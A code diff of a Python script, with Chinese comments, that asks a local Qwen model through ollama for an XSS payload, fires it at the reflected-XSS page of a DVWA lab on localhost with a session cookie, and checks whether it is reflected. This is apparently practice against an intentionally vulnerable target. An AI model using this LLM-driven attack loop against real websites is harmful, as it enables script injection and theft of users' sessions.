@@ -1,19 +1,23 @@
 import requests
 import ollama
 
-# 靶场地址（DVWA 的 XSS 反射型页面）
+# 靶场地址
 url = "http://127.0.0.1/vulnerabilities/xss_r/"
 
-# ⚠️ 必须修改这里！
+# 警告：实际使用时必须替换为你浏览器 F12 抓到的真实 PHPSESSID
 cookies = {
-    "PHPSESSID": "# 把原来的 model='qwen2.5' 或者 qwen2.5:1.5b 统统删掉，换成：
-response = ollama.chat(model='modelscope.cn/Qwen/Qwen2.5-1.5B-Instruct-GGUF', messages=[",  # 去浏览器F12里复制
+    "PHPSESSID": "j5ngfrpuko2aqgo0rht4am0sh4",  
     "security": "low"
 }
 
-print("【AI 正在疯狂思考恶意 Payload...】")
+print("【1】正在启动 Docker 靶场...")
+# 如果你在本地跑，这行可以自动拉起靶场
+# import os
+# os.system("sudo docker start dvwa")
 
-# 调用本地大模型生成 Payload
+print("【2】AI 正在疯狂思考恶意 Payload...")
+
+# 调用本地 Qwen 模型
 response = ollama.chat(model='modelscope.cn/Qwen/Qwen2.5-1.5B-Instruct-GGUF', messages=[
   {
     'role': 'user',
@@ -21,18 +25,19 @@ response = ollama.chat(model='modelscope.cn/Qwen/Qwen2.5-1.5B-Instruct-GGUF', me
   }
 ])
 
-# 清理大模型生成的文本
 ai_payload = response['message']['content'].strip()
+# 清理大模型生成的 markdown 符号
 ai_payload = ai_payload.replace("```html", "").replace("```javascript", "").replace("```", "").strip()
 
-print(f"【AI 生成的 Payload】: {ai_payload}")
-print("【正在自动发送攻击...】")
+print(f"🎯 AI 生成的 Payload: {ai_payload}")
+print("【3】正在向靶场发送攻击...")
 
-# 发送攻击请求
-r = requests.get(url, params={"name": ai_payload, "Submit": "Submit"}, cookies=cookies)
-
-# 验证是否成功
-if ai_payload in r.text or "AI破了防" in r.text:
-    print(f"🚨 [致命打击] AI Fuzzing 成功！Payload 生效！")
-else:
-    print("[-] 失败。检查 PHPSESSID 是不是过期了，或者靶场没开。")
+try:
+    r = requests.get(url, params={"name": ai_payload, "Submit": "Submit"}, cookies=cookies, timeout=10)
+    # 检查 payload 是否成功反射到页面中
+    if ai_payload in r.text or "AI破了防" in r.text:
+        print("\n🚨🚨🚨 [致命打击] AI Fuzzing 成功！Payload 生效！\n")
+    else:
+        print("\n[-] 失败。请检查 PHPSESSID 是否过期或靶场是否未登录。\n")
+except Exception as e:
+    print(f"\n❌ 请求靶场失败: {e}")
